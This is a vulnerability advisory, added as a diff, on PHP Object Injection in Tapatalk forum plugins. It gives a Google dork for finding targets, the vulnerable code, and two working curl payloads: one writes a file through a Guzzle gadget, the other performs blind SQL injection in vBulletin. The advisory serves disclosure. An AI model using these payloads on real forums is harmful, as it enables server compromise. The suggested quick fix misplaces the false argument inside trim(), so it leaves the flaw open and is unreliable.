@@ -1,0 +1,140 @@
+id: 36861
+date: 10/06/2021
+title: Tapatalk Plugins PHP Object Injection Vulnerability
+author: dH team
+cves: 
+
+Tapatalk Plugins PHP Object Injection
+
+dH team discovered PHP Object Injection vulnerability in all Tapatalk plugins, 
+which is allow to attackers execute PHP code, SQL injection or Denial of Service.
+No authorization or some extra steps need, so vulnerability considered critical.
+
+Details
+=======
+Vendor: https://tapatalk.com
+Dork: inurl: mobiquo/mobiquo.php
+Product: Tapatalk Plugin for Xenforo, vBulletin, IPBoard, PHPbb, WolfLab, MyBB
+Affected versions (below):
+
+vBulletin 3.7/8.x < 5.1.0
+vBulletin 4.x.x < 5.7.7
+vBulletin 5.0.x < 1.3.7
+IP.Board 3.4 Series and Above < 4.5.2
+IPBoard 4.0/4.1 < 1.4.2
+IPBoard 4.2 or Above < 2.0.3
+MyBB 1.6 / 1.8 < 4.6.7
+phpBB 3.0 Series < 5.0.3
+phpBB 3.1/3.2/3.3 Series < 2.1.9
+Woltlab Burning Board 4.x < 1.4.2
+Woltlab Burning Board 5.x < 1.5.1
+XenForo 1.0.x < 3.2.7
+XenForo 2.x < 1.3.0
+
+Vulnerability Type: PHP Object Injection (https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
+Security Risk: Critical
+Vendor URL: https://tapatalk.com
+Vendor Status: fixed plugins versions released, can be download at https://www.tapatalk.com/tapatalk_mobile
+
+
+Introduction
+============
+
+"Building Great Communities
+Tapatalk is the mobile-first community platform trusted by hundreds of thousands communities worldwide. 
+Start a new community today or connect your community with our mobile app. 
+It's the infrastructure and service you need to build a great community."
+
+(from Tapatalk's Homepage)
+
+
+Details
+============
+
+Tapatalk plugin API method `push_content_check` uses insecure unserialize() function call on raw user POST `data` variable, 
+which leads to PHP object injection, and possible to RCE or SQL Injection on forum server.
+
+Example of vulnerable code (from vBulletin 4.x plugin):
+
+------------------------------------------------------------------------
+<?php
+[...]
+function push_content_check_func(){
+    global $vbulletin, $db;
+    $code = trim($_POST['code']);
+    $format = isset($_POST['format']) ? trim($_POST['format']) : '';
+//>>>>>> HERE UNSAFE UNSERIALIZE() OCCURS <<<<<<<
+    $data = unserialize(trim($_POST['data']));
+
+    $result = array( 'result' => false );
+    try {
+        $connection = new classTTConnection();
+        $response = $connection->actionVerification($code, 'push_content_check');
+        if ($response !== true){
+            $result['result_text'] = $response;
+            echo ($format == 'json') ? json_encode($result) : serialize($result);
+            exit;
+        }
+//>>>>>>>>>> AND HERE WE ALSO CAN USE DESERIALIZED OBJECT CLASSES WITH MAGIC METHOD offsetExists() FOR ARRAYABLE OBJECTS VIA isset($data['key']) <<<<<<<<<<
+        if(!isset($vbulletin->options['push_key']) || !isset($data['key']) || $vbulletin->options['push_key'] != $data['key']){
+            $result['result_text'] = 'incorrect api key';
+            echo ($format == 'json') ? json_encode($result) : serialize($result);
+            exit;
+        }
+[...]
+
+------------------------------------------------------------------------
+
+
+Proof of Concept
+================
+
+For Xenforo 2.x:
+
+curl https://forum.site/mobiquo/mobiquo.php -d 'code=31337&method_name=push_content_check&data=a%3A1%3A%7Bs%3A4%3A%22type%22%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFiA1%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A11%3A%22%2Ftmp%2Fhacked%22%3B%7D%7D'
+
+Creates empty file `/tmp/hacked` on forum server
+
+For vBulletin 4.x
+
+curl https://forum.site/mobiquo/mobiquo.php -d 'code=31337&method_name=push_content_check&data=O%3A25%3A%22vB_Collection_ContentType%22%3A6%3A%7Bs%3A11%3A%22%00%2A%00cachable%22%3Bb%3A0%3Bs%3A12%3A%22%00%2A%00important%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00query_info%22%3Ba%3A1%3A%7Bi%3A1%3Bi%3A1%3B%7Ds%3A16%3A%22%00%2A%00required_info%22%3Bi%3A1%3Bs%3A14%3A%22%00%2A%00loaded_info%22%3Bi%3A0%3Bs%3A9%3A%22%00%2A%00itemid%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%220%29+OR+sleep%281%22%3B%7D%7D'
+
+The result is Blind SQL Injection (SLEEP(1) command executed on MySQL Server)
+
+Workaround
+==========
+
+The PHP function `unserialize()` shouldn't be used with raw user input.
+For PHP > 7.x exists second function argument (from PHP documentation):
+
+"allowed_classes (mixed)
+Either an array of class names which should be accepted, false to accept no classes, or true to accept all classes. 
+If this option is defined and unserialize() encounters an object of a class that isn't to be accepted, 
+then the object will be instantiated as __PHP_Incomplete_Class instead. 
+Omitting this option is the same as defining it as true: PHP will attempt to instantiate objects of any class."
+
+`$data = unserialize(trim($_POST['data'], false));` for example code above will be the quick fix.
+
+
+Fix
+===
+
+Update the Tapatalk plugin to it's latest version.
+
+
+Timeline
+========
+
+2021-07-29 Vulnerability identified
+2021-07-29 Vendor notified via https://tapatalk.com/security.php
+2021-08-09 Vendor notified again, received reply from vendor
+2021-08-26 Updated plugins released by vendor
+2021-09-02 Updated plugins released by vendor
+2021-10-05 Advisory released
+
+Credits
+=======
+
+dH team
+
+#  0day.today [2023-03-27]  #
